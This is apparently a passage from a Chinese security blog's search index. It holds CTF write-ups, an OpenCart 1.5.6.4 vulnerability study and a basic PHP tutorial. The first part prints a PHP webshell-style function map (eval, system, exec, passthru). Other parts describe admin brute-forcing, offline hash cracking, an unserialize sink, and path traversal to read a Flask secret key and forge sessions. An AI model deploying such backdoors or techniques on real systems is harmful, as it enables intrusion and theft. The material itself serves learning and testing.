***\\n&#x27;);$getFunction(&#x27;crazy&#x27;)(&#x27;crazy.php&#x27;);$getFunction(&quot;vivo&quot;)(code($hahahahahaha));?&gt;\n\n原来后面又上传了一个文件\n//chickenvivo50.php$func_map = [  &quot;print&quot; =&gt; function($code) &#123;@eval($code);&#125;,  &quot;thursday&quot; =&gt; &quot;exec&quot;,  &#x27;chicken&#x27; =&gt; &#x27;system&#x27;,  &#x27;vivo&#x27; =&gt; &#x27;header&#x27;,  &#x27;vv50&#x27; =&gt; &#x27;passthru&#x27;,  &quot;crazy&quot; =&gt; function($file) &#123; require_once($file); &#125;];$getFunction = function($name) use ($func_map) &#123;  return isset($func_map[$name]) ? $func_map[$name] : null;&#125;;?&gt;\n\n总之这个文件就是将我们读取的flag然后通过crazy.php中的进行加密，然后返回到cookie中，我们只需要找到那个请求头然后进行解密就行了，但是这个加密我都看不懂就别说解密了\nPOST /uploads/?cmd=ThURSDAY HTTP/1.1Host: 172.17.0.2User-Agent: curl/7.58.0Accept: */*Content-Length: 14Content-Type: application/x-www-form-urlencodedfile=crazy.phpHTTP/1.1 200 OKDate: Fri, 19 Sep 2025 00:24:48 GMTServer: Apache/2.4.29 (Ubuntu)Cookie: token=R2FYdDNaaHhtWlMwS21TR0szRVZxSUF4QVV5c0hLVzlWZXN0MllwVmdDOUJUTlBaVlM9PQ==Content-Length: 18Content-Type: text/html; charset=UTF-8***nHello, world!\n\n只能使用大佬的脚本\nimport base64from itertools import productcookie_value = &quot;R2FYdDNaaHhtWlMwS21TR0szRVZxSUF4QVV5c0hLVzlWZXN0MllwVmdDOUJUTlBaVlM9PQ==&quot;decoded_bytes = base64.b64decode(cookie_value)s = decoded_bytes.decode(&#x27;utf-8&#x27;)print(&quot;s length:&quot;, len(s))print(&quot;s:&quot;, s)# Split s into groups of 10, last group may be shorter.groups = []for i in range(0, len(s), 10):    groups.append(s[i:i+10])print(&quot;Groups:&quot;, groups)def str_rot13(s):    result = []    for c in s:        if &#x27;a&#x27; &lt;= c &lt;= &#x27;z&#x27;:            result.append(chr((ord(c) - ord(&#x27;a&#x27;) + 13) % 26 + ord(&#x27;a&#x27;)))        elif &#x27;A&#x27; &lt;= c &lt;= &#x27;Z&#x27;:            result.append(chr((ord(c) - ord(&#x27;A&#x27;) + 13) % 26 + ord(&#x27;A&#x27;)))        else:            result.append(c)    return &#x27;&#x27;.join(result)def str_rev(s):    return s[::-1]# Try all combinations of operations on groupsnum_groups = len(groups)for operations in product([str_rev, str_rot13], repeat=num_groups):    candidate = &#x27;&#x27;    for i in range(num_groups):        candidate += operations[i](groups[i])    try:        decoded_flag = base64.b64decode(candidate).decode(&#x27;utf-8&#x27;)        if &#x27;flag&#x27; in decoded_flag:            print(&quot;Found flag:&quot;, decoded_flag)            print(&quot;With operations:&quot;, [op.__name__ for op in operations])            print(&quot;Candidate base64:&quot;, candidate)            break    except:        passelse:    print(&quot;No flag found with &#x27;flag&#x27; keyword. Trying all valid decoding:&quot;)    for operations in product([str_rev, str_rot13], repeat=num_groups):        candidate = &#x27;&#x27;        for i in range(num_groups):            candidate += operations[i](groups[i])        try:            decoded_flag = base64.b64decode(candidate).decode(&#x27;utf-8&#x27;)            print(&quot;Decoded:&quot;, decoded_flag, &quot; with operations:&quot;, [op.__name__ for op in operations])        except:            continue\n\n新生赛怎么都这么难，这个解密应该不需要学密码吧\n\n\n"},{"title":"Opencart1.5.6.4漏洞复现","url":"/2025/08/25/Opencart1-5-6-4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","content":"Opencart1.5.6.4漏洞复现这是一个估计是14年左右的电商平台，也是奔着这个漏洞多，代码简单拿来漏洞复现试下手，虽然是想尝试挖一下洞的，但是还是要尊重一手，网上现在没有什么直接的payload，不看源码纯挖洞的话还是做不到\n路由解析方式我觉得无论是在哪个框架中，我想要进行代码审计都必须知道这个框架的路由解析方式，不然即使漏洞触发了也没法找到对应的代码进行审计。\n我们先来看Index.php中的重要代码，即根路由解析的入口\n// Routerif (isset($request-&gt;get[&#x27;route&#x27;])) &#123;\t$action = new Action($request-&gt;get[&#x27;route&#x27;]);&#125; else &#123;\t$action = new Action(&#x27;common/home&#x27;);&#125;\n\n我们可以看到从我们的路由中获取了route参数然后实例化Action方法\nAction 类的构造函数会接受一个路由字符串，并根据路由调用对应的控制器和方法。\nclass Action &#123;    private $route;        public function __construct($route) &#123;        $this-&gt;route = $route;    &#125;        public function execute($registry) &#123;        // 解析控制器和方法        $parts = explode(&#x27;/&#x27;, $this-&gt;route);                // 控制器类路径        $file = DIR_APPLICATION . &#x27;controller/&#x27; . implode(&#x27;/&#x27;, $parts) . &#x27;.php&#x27;;//在index.php中，都会定义DIR_APPLIATION定义从哪个目录下解析路由                if (file_exists($file)) &#123;            require_once($file);        &#125;                $class = &#x27;Controller&#x27; . implode(&#x27;&#x27;, array_map(&#x27;ucwords&#x27;, $parts));        $controller = new $class($registry);                // 默认方法是 &#x27;index&#x27;        $method = isset($this-&gt;params[0]) ? $this-&gt;params[0] : &#x27;index&#x27;;                // 调用方法并返回结果        return call_user_func_array(array($controller, $method), $this-&gt;params);    &#125;&#125;\n\n我们可以看到，和ThinkPHP一样都是通过路由加载controller下的类文件然后进行包含，这个也就是路由解析的基础代码了，但是问了GPT还有一些方法间接通过Action类进行路由解析\n$controller_output = $this-&gt;load-&gt;controller(&#x27;product/product&#x27;);\n\n$this-&gt;load-&gt;controller() 实际上是调用了 Loader 类 中的 controller() 方法\n// system/library/load.phppublic function controller($route, $args = array()) &#123;    // 加载控制器    $action = new Action($route);    // 执行控制器方法并返回输出    return $action-&gt;execute($this-&gt;registry, $args);&#125;\n\n这个实际上也是通过加载Action类然后调用execute方法进行路由解析。\n注册表机制\n但是其实发现了一些不对劲的地方，为什么$this-&gt;load-&gt;controller() 实际上是调用了 Loader 类，名字不对就算了，类中直接调用类这种写法我还是在构造pop链的时候看到过，这个其实是opencart的一种特殊的注册表机制\n我们在index.php中看到大量这种代码\n// Registry$registry = new Registry();// Loader$loader = new Loader($registry);$registry-&gt;set(&#x27;load&#x27;, $loader);// Config$config = new Config();$registry-&gt;set(&#x27;config&#x27;, $config);// Currency$registry-&gt;set(&#x27;currency&#x27;, new Currency($registry));// Tax$registry-&gt;set(&#x27;tax&#x27;, new Tax($registry));// Weight$registry-&gt;set(&#x27;weight&#x27;, new Weight($registry));// Length$registry-&gt;set(&#x27;length&#x27;, new Length($registry));\n\n我们可以看到Registry通过调用set方法去将一个个实例化的对象作为参数，我们看load可以发现好像将对象作为一个属性储存在了其他对象中，至于属性名则是前面哪个字符串\n 这个类其实就是一个 数组容器，用来存储 key =&gt; value 对象。\n\nset(&#39;cart&#39;, new Cart($registry))  存储\nget(&#39;cart&#39;) 获取\n\n这样，这些对象就被统一存放到 $registry-&gt;data[] 数组里了。\n然后按理来说如果在controller类中想要调用方法，我们需要将$registry作为参数，然后调用$this-&gt;registry-&gt;load进行调用，实际上是进行了从写方法，然后将其省略了\nclass Controller &#123;    protected $registry;    public function __construct($registry) &#123;        $this-&gt;registry = $registry;    &#125;    public function __get($key) &#123;        return $this-&gt;registry-&gt;get($key);    &#125;    public function __set($key, $value) &#123;        $this-&gt;registry-&gt;set($key, $value);    &#125;&#125;\n\n然后调用就是\n$this-&gt;load   // 调用 $this-&gt;registry-&gt;get(&#x27;load&#x27;)$this-&gt;cart   // 调用 $this-&gt;registry-&gt;get(&#x27;cart&#x27;)\n\n\n\n\n\n1.弱口令每一个电商平台都会出现的问题就是管理员，就是在没有经过改路由的情况下直接访问\n127.0.0.1/admin\n\n然后通过弱口令爆破，但是如果是换一些其他比如qq号等做密码基本上就爆不出来了。但我感觉大部分应该还是会使用一些常见的默认密码\n还有就是管理员密码应该是可以通过sql注入注出来的\n\n\n我们可以看到是通过哈希进行不可逆哈希，但是我们只要知道其哈希值和加密方式即可以通过爆破来推断出密码，密码的校验应该也是判断哈希值是否一样，类似md5碰撞，但是碰撞难度不一\nhash = SHA1( salt + SHA1( salt + SHA1(password) ) )//这个是opencart的哈希方式 salt为密匙\n\n问了一下GPT，说密匙再加三层哈希这种想要直接爆破几乎不能，但是我们如果知道密匙和哈希值就可以通过直接使用遍历字典进行破解出密码\n2.反序列化漏洞1.CVE-2014-3990我们先来看部分源码\n&lt;?phpclass Cart &#123;\tprivate $config;\tprivate $db;\tprivate $data = array();\tprivate $data_recurring = array();\tpublic function __construct($registry) &#123;\t\t$this-&gt;config = $registry-&gt;get(&#x27;config&#x27;);\t\t$this-&gt;customer = $registry-&gt;get(&#x27;customer&#x27;);\t\t$this-&gt;session = $registry-&gt;get(&#x27;session&#x27;);//这个session作为一个对象是不能通过GET传递的，这个应该是get方法中对session进行了赋值\t\t$this-&gt;db = $registry-&gt;get(&#x27;db&#x27;);\t\t$this-&gt;tax = $registry-&gt;get(&#x27;tax&#x27;);\t\t$this-&gt;weight = $registry-&gt;get(&#x27;weight&#x27;);//get方法就将其作为一个从请求头中获取参数的方法，至于参数是属性名而不是GET参数名  GET/POST 数据封装在 $this-&gt;request-&gt;get / $this-&gt;request-&gt;post\t\tif (!isset($this-&gt;session-&gt;data[&#x27;cart&#x27;]) || !is_array($this-&gt;session-&gt;data[&#x27;cart&#x27;])) &#123;\t\t\t$this-&gt;session-&gt;data[&#x27;cart&#x27;] = array();//如果没有传递则为空数组\t\t&#125;\t&#125;//构造方法，将我们传入参数赋值给属性\tpublic function getProducts() &#123;\t\tif (!$this-&gt;data) &#123;//第一次data为空进行赋值\t\t\tforeach ($this-&gt;session-&gt;data[&#x27;cart&#x27;] as $key =&gt; $quantity) &#123;\t\t\t\t$product = explode(&#x27;:&#x27;, $key);//将cart使用:分隔开来\t\t\t\t$product_id = $product[0];//取第一个作为id\t\t\t\t$stock = true;\t\t\t\t// Options\t\t\t\tif (!empty($product[1])) &#123;\t\t\t\t\t$options = unserialize(base64_decode($product[1]));//漏洞点，直接将我们可以控制的数据进行反序列化\t\t\t\t&#125; else &#123;\t\t\t\t\t$options = array();\t\t\t\t&#125; \n\n但是这里只是仅仅进行了反序列化，但其实没有什么好的魔术方法让我们去实现SSRF或者RCE\n"},{"title":"[PASECA2019]honey_shop","url":"/2025/05/12/PASECA2019-honey-shop/","content":"[PASECA2019]honey_shop妈的，终于来了一个我可以看懂的题目了，最近全是代码审计题，快晕了\n我们进入界面是一个购买蜂蜜的的界面，我们距离买到flag还差亿元，看来还是需要改金额\n\n\n我们直接抓购买包发现POST请求传递了一个item&#x3D;1，我们可以通过改变序号去改变商品。\n\n\ncookie中还有一串数据长得和jwt数据差不多，直接拿去解码\n\n\n这种我之前见到过，flask的session解码会出现这种情况，改金额的地方也找到了，但是我们还没有密匙去进行加密\n看了wp发现，我们点击界面中间的图片，会自动下载图片，我们抓那个包会发现一个传参，经测试可以利用目录穿越进行任意文件读取，由于是flask，我尝试读取源码\n\n\n发现不是的不存在而是不允许读取，看来得看看其他的\nwp说可以在/proc/self/environ中看到linux系统中的环境变量\n在Linux系统中，/proc/self/environ 是一个特殊的虚拟文件，它存储了 当前进程（self）的环境变量。\n我们直接访问，可以看到key\n\n\n我们直接拿着这个key到flask_ssession中去进行加密\n\n\n然后直接替换掉session就可以买下flag了\n\n"},{"title":"PHP","url":"/2024/12/31/PHP/","content":"PHP笔记1.PHP简介1.PHP是什么\nPHP 文件可包含文本、HTML、JavaScript代码和 PHP 代码\nPHP 代码在服务器上执行，结果以纯 HTML 形式返回给浏览器\nPHP 文件的默认文件扩展名是 .php。\n\n2.PHP文件是什么\nPHP 文件可包含文本、HTML、JavaScript代码和 PHP 代码\nPHP 代码在服务器上执行，结果以纯 HTML 形式返回给浏览器\nPHP 文件的默认文件扩展名是 .php。\n\n3.PHP能做什么\nPHP 可以生成动态页面内容\nPHP 可以创建、打开、读取、写入、关闭服务器上的文件\nPHP 可以收集表单数据\nPHP 可以发送和接收 cookies\nPHP 可以添加、删除、修改您的数据库中的数据\nPHP 可以限制用户访问您的网站上的一些页面\nPHP 可以加密数据\n\n2.PHP基础1.PHP基本语法PHP 脚本以  结束：phpd的注释：\n&lt;?php// PHP 代码单行注释/*多行注释*/?&gt;\n\n2.PHP变量与代数类似，可以给 PHP 变量赋予某个值（x&#x3D;5）或者表达式（z&#x3D;x+y）。\n变量可以是很短的名称（如 x 和 y）或者更具描述性的名称（如 age、carname、totalvolume）。\nPHP 变量规则：\n\n变量以 $ 符号开始，后面跟着变量的名称\n变量名必须以字母或者下划线字符开始\n变量名只能包含字母、数字以及下划线（A-z、0-9 和 _ ）\n变量名不能包含空格\n变量名是区分大小写的（$y 和 $Y 是两个不同的变量）\n\nPHP 是一门弱类型语言\nPHP 会根据变量的值，自动把变量转换为正确的数据类型。在强类型的编程语言中，我们必须在使用变量前先声明（定义）变量的类型和名称。\n&lt;?php$txt=&quot;Hello world!&quot;;$x=5;$y=10.5;$z=&#x27;5&#x27;;echo $x+$z;?&gt;\n\n输出：10；\n在进行运算时会自动将字符’5’转换为数字5；\nPHP变量作用域\n变量的作用域是脚本中变量可被引用&#x2F;使用的部分。\nPHP 有四种不同的变量作用域：\n\nlocal\nglobal\nstatic\nparameter\n\n在所有函数外部定义的变量，拥有全局作用域。除了函数外，全局变量可以被脚本中的任何部分访问，要在一个函数中访问一个全局变量，需要使用 global 关键字。\n在 PHP 函数内部声明的变量是局部变量，仅能在函数内部访问：\nglobal 关键字用于函数内访问全局变量。\n在函数内调用函数外定义的全局变量，我们需要在函数中的变量前加上 global 关键字\n$x = 5; // 全局变量function myTest()&#123;    $y = 10; // 局部变量    echo &quot;&lt;p&gt;测试函数内变量:&lt;p&gt;&quot;;    echo &quot;变量 x 为: $x&quot;;    echo &quot;&lt;br&gt;&quot;;    echo &quot;变量 y 为: $y&quot;;    global $x;    echo &#x27;&lt;br&gt;&#x27;;    echo &quot;变量 x 为: $x&quot;;&#125;myTest();echo &quot;&lt;p&gt;测试函数外变量:&lt;p&gt;&quot;;echo &quot;变量 x 为: $x&quot;;echo &quot;&lt;br&gt;&quot;;echo &quot;变量 y 为: $y&quot;;echo $x+$z;\n\n运行结果：\n\n\n当一个函数完成时，它的所有变量通常都会被删除。然而，有时候您希望某个局部变量不要被删除。\n要做到这一点，请在您第一次声明变量时使用 static 关键字：\n&lt;?phpfunction myTest()&#123;    static $x=0;    echo $x;    $x++;    echo PHP_EOL;    // 换行符&#125; myTest();myTest();myTest();?&gt;\n\nstatic使x未被删除，保留了x的值运行结果为：0 1 2\n3.PHP输出echo语句echo 是一个语言结构，使用的时候可以不用加括号，也可以加上括号： echo 或 echo()。\n&lt;?phpecho &quot;&lt;h2&gt;PHP 很有趣!&lt;/h2&gt;&quot;;echo &quot;Hello world!&lt;br&gt;&quot;;echo &quot;我要学 PHP!&lt;br&gt;&quot;;echo &quot;这是一个&quot;, &quot;字符串，&quot;, &quot;使用了&quot;, &quot;多个&quot;, &quot;参数。&quot;,&quot;&lt;br&gt;&quot;;echo &quot;可以&quot;.&quot;把多个&quot;.&quot;字符串&quot;.&quot;连接&quot;;$txt1=&quot;学习 PHP&quot;;$txt2=&quot;RUNOOB.COM&quot;;$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;); print $txt1;print &quot;&lt;br&gt;&quot;;print &quot;在 $txt2 学习 PHP &quot;;print &quot;&lt;br&gt;&quot;;print &quot;我车的品牌是 &#123;$cars[0]&#125;?&gt;\n\n在输出时，’ ‘与” “基本相同，但当其中有变量时使用’ ‘则会直接输出变量名，  “ “才可以正常输出值实例：\n$x = 5;echo &quot;&lt;p&gt;测试函数外变量:&lt;p&gt;&quot;;echo &quot;变量 x 为: $x&quot;;echo &#x27;变量x为: $x&#x27;;\n\n\n\nprint语句print 同样是一个语言结构，可以使用括号，也可以不使用括号： print 或 print()。print - 只允许输出一个字符串，返回值总为 1；\n&lt;?phpprint &quot;&lt;h2&gt;PHP 很有趣!&lt;/h2&gt;&quot;;print &quot;Hello world!&lt;br&gt;&quot;;print &quot;我要学习 PHP!&quot;;?&gt;\n\n\n\necho和print语句的区别\n\necho - 可以输出一个或多个字符串\nprint - 只允许输出一个字符串，返回值总为 1\n\n4.php数据类型PHP 变量存储不同的类型的数据，不同的数据类型可以做不一样的事情。\nPHP 支持以下几种数据类型:\n\nString（字符串）\nInteger（整型）\nFloat（浮点型）\nBoolean（布尔型）\nArray（数组）\nObject（对象）\nNULL（空值）\nResource（资源类型）\n\nPHP字符串\n一个字符串是一串字符的序列，就像 “Hello world!”。\n你可以将任何文本放在单引号和双引号中：\nPHP整型\n整数是一个没有小数的数字。\n整数规则:\n\n整数必须至少有一个数字 (0-9)\n整数不能包含逗号或空格\n整数是没有小数点的\n整数可以是正数或负数\n整型可以用三种格式来指定：十进制， 十六进制（ 以 0x 为前缀）或八进制（前缀为 0）。\n\n补充一个函数var_dump():\nvar_dump()是 PHP 中的一个内置函数，用于输出变量的详细信息，包括变量的类型和值。这对于调试和了解变量的具体内容非常有用。下面是一些使用 var_dump() 的示例：\n&lt;?php $x = 5985;var_dump($x);echo &quot;&lt;br&gt;&quot;; $x = -345; // 负数 var_dump($x);echo &quot;&lt;br&gt;&quot;; $x = 0x8C; // 十六进制数var_dump($x);echo &quot;&lt;br&gt;&quot;;$x = 047; // 八进制数var_dump($x);?&gt;\n\n\n\nPHP浮点型\n浮点数是带小数部分的数字，或是指数形式。\n在以下实例中我们将测试不同的数字。 PHP var_dump() 函数返回变量的数据类型和值：\n&lt;?php $x = 10.365;var_dump($x);echo &quot;&lt;br&gt;&quot;; $x = 2.4e3;//2.4*10^3var_dump($x);echo &quot;&lt;br&gt;&quot;; $x = 8E-5;var_dump($x);?&gt;\n\n\n\nPHP布尔型\n布尔型可以是 TRUE 或 FALSE。\n$x=true;$y=false;\n\nPHP数组\n数组可以在一个变量中存储多个值。\n在以下实例中创建了一个数组， 然后使用 PHP var_dump() 函数返回数组的数据类型和值：\n&lt;?php $cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);var_dump($cars);?&gt;\n\n这里只是简单介绍后面会详细说明\nPHP对象\n对象数据类型也可以用于存储数据。\n在 PHP 中，对象必须声明。\n首先，你必须使用class关键字声明类对象。类是可以包含属性和方法的结构。\n然后我们在类中定义数据类型，然后在实例化的类中使用数据类型：\n&lt;?phpclass Car&#123;  var $color;  function __construct($color=&quot;green&quot;) &#123;    $this-&gt;color = $color;  &#125;  function what_color() &#123;    return $this-&gt;color;  &#125;&#125;?&gt;\n\nPHP类型比较\n虽然 PHP 是弱类型语言，但也需要明白变量类型及它们的意义，因为我们经常需要对 PHP 变量进行比较，包含松散和严格比较。\n\n松散比较：使用两个等号 &#x3D;&#x3D; 比较，只比较值，不比较类型。\n严格比较：用三个等号 &#x3D;&#x3D;&#x3D; 比较，除了比较值，也比较类型。\n\n例如，”42” 是一个字符串而 42 是一个整数。FALSE 是一个布尔值而 “FALSE” 是一个字符串。\n&lt;?phpif(42 == &quot;42&quot;) &#123;    echo &#x27;1、值相等&#x27;;&#125; echo PHP_EOL; // 换行符 if(42 === &quot;42&quot;) &#123;    echo &#x27;2、类型相等&#x27;;&#125; else &#123;    echo &#x27;3、类型不相等&#x27;;&#125;?&gt;\n\n\n\n相应的0，’0’，’false’，’null’，松散比较相等，严格比价则不相等\n5.PHP常量PHP 中的常量是指一旦定义后其值不能被改变的标识符。\n常量值被定义后，在脚本的其他任何地方都不能被改变。\n常量可以用 define() 函数或 const 关键字来定义。\n\n不变性: 常量一旦定义，其值不能改变。\n全局作用域: 常量在定义后，可以在整个脚本的任何地方使用，无需使用 global 关键字。\n数据类型: 常量的值可以是标量数据类型（如布尔值、整数、浮点数、字符串）或数组（PHP 7 及以上版本）。\n区分大小写: 常量名称默认是区分大小写的。如果需要定义大小写不敏感的常量，可以在 define() 函数的第三个参数设置为 true。\n\ndefine定义常量\n设置常量，使用 define() 函数，函数语法如下：\nbool define ( string $name , mixed $value [, bool $case_insensitive = false ] )\n\n 实例：\n&lt;?php// 不区分大小写的常量名define(&quot;GREETING&quot;, &quot;欢迎访问 Runoob.com&quot;, true);echo greeting;  // 输出 &quot;欢迎访问 Runoob.com&quot;?&gt;\n\n\n\n该函数有三个参数:\n\nname：必选参数，常量名称，即标志符。\n\nvalue：必选参数，常量的值。\n\ncase_insensitive ：可选参数，如果设置为 TRUE，该常量则大小写不敏感，默认是大小写敏感的。\n  注意：自 PHP 7.3.0 开始，定义不区分大小写的常量已被弃用。从 PHP 8.0.0 开始，只有 false 是可接受的值，传递 true 将产生一个警告。\n\n\n一个常量由英文字母、下划线、和数字组成，但数字不能作为首字母出现。 (常量名不需要加 $ 修饰符)。\nconst定义常量\n以下是一个使用 const 关键字定义常量的语法：\nconst CONSTANT_NAME = &quot;value&quot;;\n\n实例：\nconst SITE_URL = &quot;https://www.runoob.com&quot;;echo SITE_URL; // 输出 &quot;https://www.runoob.com&quot;\n\n预定义常量\nPHP 提供了一些预定义常量，可以在脚本中直接使用。这些常量通常用于获取 PHP 的配置信息、版本信息等。常见的预定义常量有：\n\nPHP_VERSION：当前 PHP 解析器的版本。\nPHP_OS：服务器的操作系统。\nPHP_INT_MAX：最大的整数值。\nE_ERROR、E_WARNING、E_PARSE 等：错误报告级别。\n\n6.PHP字符串字符串变量用于包含有字符的值。\n在创建字符串之后，我们就可以对它进行操作了。您可以直接在函数中使用字符串，或者把它存储在变量中。\nPHP并置运算符\n在 PHP 中，只有一个字符串运算符。\n并置运算符 (.) 用于把两个字符串值连接起来。\n下面的实例演示了如何将两个字符串变量连接在一起：\n$x=&#x27;hello&#x27;;$y=&#x27;world&#x27;;$z=$x.$y;echo $z;\n\n虽然在输出时’,’与’.’似乎没区别，但只有’.’可以使两个字符串连接在一起如上代码\nPHP strlen()函数strlen() 函数返回字符串的长度（字节数）。\necho strlen(&quot;Hello world!&quot;);\n\n输出结果为：12\nPHP strpos()函数\nstrpos() 函数用于在字符串内查找一个字符或一段指定的文本。\n如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果未找到匹配，则返回 FALSE。\necho strpos(&quot;Hello world!&quot;,&quot;world&quot;);\n\n上面的代码将输出：6\n7.PHP运算符算术运算符\n\n\n\n运算符\n名称\n描述\n实例\n结果\n\n\n\nx + y\n加\nx 和 y 的和\n2 + 2\n4\n\n\nx - y\n减\nx 和 y 的差\n5 - 2\n3\n\n\nx * y\n乘\nx 和 y 的积\n5 * 2\n10\n\n\nx &#x2F; y\n除\nx 和 y 的商\n15 &#x2F; 5\n3\n\n\nx % y\n模（除法的余数）\nx 除以 y 的余数\n5 % 2 10 % 8 10 % 2\n1 2 0\n\n\n-x\n设置负数\n取 x 的相反符号\n&lt;?php $x = 2; echo -$x; ?&gt;\n-2\n\n\n~x\n取反\nx 取反，按二进制位进行”取反”运算。运算规则：~1=-2;    ~0=-1;\n&lt;?php $x = 2; echo ~$x; ?&gt;\n-3\n\n\na . b\n并置\n连接两个字符串\n“Hi” . “Ha”\nHiHa\n\n\nPHP赋值运算符\n在 PHP 中，基本的赋值运算符是 &#x3D;。它意味着左操作数被设置为右侧表达式的值。也就是说，$x &#x3D; 5 的值是 5。\n\n\n\n运算符\n等同于\n描述\n\n\n\nx &#x3D; y\nx &#x3D; y\n左操作数被设置为右侧表达式的值\n\n\nx +&#x3D; y\nx &#x3D; x + y\n加\n\n\nx -&#x3D; y\nx &#x3D; x - y\n减\n\n\nx *&#x3D; y\nx &#x3D; x * y\n乘\n\n\nx &#x2F;&#x3D; y\nx &#x3D; x &#x2F; y\n除\n\n\nx %&#x3D; y\nx &#x3D; x % y\n模（除法的余数）\n\n\na .&#x3D; b\na &#x3D; a . b\n连接两个字符串\n\n\nPHP递增&#x2F;递减运算符\n\n\n\n运算符\n名称\n描述\n\n\n\n++ x\n预递增\nx 加 1，然后返回 x\n\n\nx ++\n后递增\n返回 x，然后 x 加 1\n\n\n– x\n预递减\nx 减 1，然后返回 x\n\n\nx –\n后递减\n返回 x，然后 x 减 1\n\n\nPHP比较运算符\n\n\n\n运算符\n名称\n描述\n实例\n\n\n\nx &#x3D;&#x3D; y\n等于\n如果 x 等于 y，则返回 true\n5&#x3D;&#x3D;8 返回 false\n\n\nx &#x3D;&#x3D;&#x3D; y\n绝对等于\n如果 x 等于 y，且它们类型相同，则返回 true\n5&#x3D;&#x3D;&#x3D;”5” 返回 false\n\n\nx !&#x3D; y\n不等于\n如果 x 不等于 y，则返回 true\n5!&#x3D;8 返回 true\n\n\nx &lt;&gt; y\n不等于\n如果 x 不等于 y，则返回 true\n5&lt;&gt;8 返回 true\n\n\nx !&#x3D;&#x3D; y\n不绝对等于\n如果 x 不等于 y，或它们类型不相同，则返回 true\n5!&#x3D;&#x3D;”5” 返回 true\n\n\nx &gt; y\n大于\n如果 x 大于 y，则返回 true\n5&gt;8 返回 false\n\n\nx &lt; y\n小于\n如果 x 小于 y，则返回 true\n5&lt;8 返回 true\n\n\nx &gt;&#x3D; y\n大于等于\n如果 x 大于或者等于 y，则返回 true\n5&gt;&#x3D;8 返回 false\n\n\nx &lt;&#x3D; y\n小于等于\n如果 x 小于或者等于 y，则返回 true\n5&lt;&#x3D;8 返回 true\n\n\nPHP数组运算符\n感觉从数组运算符开始有难度了\n\n\n\n运算符\n名称\n描述\n\n\n\nx + y\n集合\nx 和 y 的集合\n\n\nx &#x3D;&#x3D; y\n相等\n如果 x 和 y 具有相同的键&#x2F;值对，则返回 true\n\n\nx &#x3D;&#x3D;&#x3D; y\n恒等\n如果 x 和 y 具有相同的键&#x2F;值对，且顺序相同类型相同，则返回 true\n\n\nx !&#x3D; y\n不相等\n如果 x 不等于 y，则返回 true\n\n\nx &lt;&gt; y\n不相等\n如果 x 不等于 y，则返回 true\n\n\nx !&#x3D;&#x3D; y\n不恒等\n如果 x 不等于 y，则返回 true\n\n\n$gun1=array(&#x27;svd&#x27;,&#x27;dlq33&#x27;,&#x27;lw3&#x27;);$gun2=array(&#x27;bp50&#x27;,&#x27;gks&#x27;,&#x27;ppsh&#x27;,&#x27;lucas&#x27;);$gun=$gun1+$gun2;var_dump($gun);$gun=$gun2+$gun1;var_dump($gun);\n\n在数组进行相加时，相同键的数据会以第一个数组为准\n\n\n其他运算符等学习数组时具体解释；\nPHP逻辑运算符\n\n\n\n运算符\n名称\n描述\n实例\n\n\n\nx and y\n与\n如果 x 和 y 都为 true，则返回 true\nx&#x3D;6 y&#x3D;3 (x &lt; 10 and y &gt; 1) 返回 true\n\n\nx or y\n或\n如果 x 和 y 至少有一个为 true，则返回 true\nx&#x3D;6 y&#x3D;3 (x=&#x3D;6 or y&#x3D;&#x3D;5) 返回 true\n\n\nx xor y\n异或\n如果 x 和 y 有且仅有一个为 true，则返回 true\nx&#x3D;6 y&#x3D;3 (x=&#x3D;6 xor y&#x3D;&#x3D;3) 返回 false\n\n\nx &amp;&amp; y\n与\n如果 x 和 y 都为 true，则返回 true\nx&#x3D;6 y&#x3D;3 (x &lt; 10 &amp;&amp; y &gt; 1) 返回 true\n\n\nx || y\n或\n如果 x 和 y 至少有一个为 true，则返回 true\nx&#x3D;6 y&#x3D;3 (x=&#x3D;5 || y&#x3D;&#x3D;5) 返回 false\n\n\n! x\n非\n如果 x 不为 true，则返回 true\nx&#x3D;6 y&#x3D;3 !(x&#x3D;&#x3D;y) 返回 true\n\n\nPHP三元运算符\n语法格式：\n(expr1) ? (expr2) : (expr3) \n\n对 expr1 求值为 TRUE 时的值为 expr2，在 expr1 求值为 FALSE 时的值为 expr3。\n自 PHP 5.3 起，可以省略三元运算符中间那部分。表达式 expr1 ?: expr3 在 expr1 求值为 TRUE 时返回 expr1，否则返回 expr3。\n组合比较符\nPHP7+ 支持组合比较符（combined comparison operator）也称之为太空船操作符，符号为 **&lt;&#x3D;&gt;**。组合比较运算符可以轻松实现两个变量的比较，当然不仅限于数值类数据的比较。\n语法格式如下：\n$c = $a &lt;=&gt; $b;\n\n解析如下：\n\n如果 $a &gt; $b, 则 $c 的值为 1。\n如果 $a &#x3D;&#x3D; $b, 则 $c 的值为 0。\n如果 $a &lt; $b, 则 $c 的值为 -1。\n\n实例：\n&lt;?php// 整型echo 1 &lt;=&gt; 1; // 0echo 1 &lt;=&gt; 2; // -1echo 2 &lt;=&gt; 1; // 1 // 浮点型echo 1.5 &lt;=&gt; 1.5; // 0echo 1.5 &lt;=&gt; 2.5; // -1echo 2.5 &lt;=&gt; 1.5; // 1 // 字符串echo &quot;a&quot; &lt;=&gt; &quot;a&quot;; // 0echo &quot;a&quot; &lt;=&gt; &quot;b&quot;; // -1echo &quot;b&quot; &lt;=&gt; &quot;a&quot;; // 1?&gt;\n\n运算优先级\n\n\n\n结合方向\n运算符\n附加信息\n\n\n\n无\nclone new\nclone 和 new\n\n\n左\n[\narray()\n\n\n右\n++ – ~ (int) (float) (string) (array) (object) (bool) @\n类型和递增／递减\n\n\n无\ninstanceof\n类型\n\n\n右\n!\n逻辑运算符\n\n\n左\n* &#x2F; %\n算术运算符\n\n\n左\n+ – .\n算术运算符和字符串运算符\n\n\n左\n&lt;&lt; &gt;&gt;\n位运算符\n\n\n无\n&#x3D;&#x3D;  !&#x3D;  =&#x3D;&#x3D;  !&#x3D;&#x3D;  &lt;&gt;\n比较运算符\n\n\n左\n&amp;\n位运算符和引用\n\n\n左\n^\n位运算符\n\n\n左\n|\n位运算符\n\n\n左\n&amp;&amp;\n逻辑运算符\n\n\n左\n||\n逻辑运算符\n\n\n左\n? :\n三元运算符\n\n\n右\n&#x3D; +&#x3D; -&#x3D; *&#x3D; &#x2F;&#x3D; .&#x3D; %&#x3D; &amp;&#x3D; |&#x3D; ^&#x3D; &lt;&lt;&#x3D; &gt;&gt;&#x3D; 